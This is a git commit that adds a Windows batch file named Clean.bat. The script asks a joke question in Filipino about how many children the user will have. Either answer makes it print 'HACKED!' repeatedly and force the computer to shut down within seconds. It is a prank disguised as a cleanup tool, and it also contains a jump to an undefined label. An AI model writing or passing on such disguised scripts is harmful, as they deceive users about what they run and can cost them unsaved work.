824f526bfe55396a46e36acc15a5aef9c2baa574
DI TO VIRUS T-T <128957505+Gavin-The-Nub@users.noreply.github.com>
2023-08-14 15:35:25 +0800

    Add files via upload

---
+++ Clean.bat
@@ -0,0 +1,43 @@
+@echo off 
+
+color a 
+echo Gusto monaba malaman kung ilan magiging anak mo?(Anwer in only yes/no)
+set /p input=
+if /i %input%==Yes goto love
+if /i %input%==No goto hate
+if /i not %input%==Yes.No goto 1
+
+:love
+echo CYA LATERRRR
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED! 
+timeout 3
+shutdown -s -t 10
+
+:hate
+echo Okay Bye
+echo HACKED
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+echo HACKED!
+timeout 3
+shutdown -s -t 10
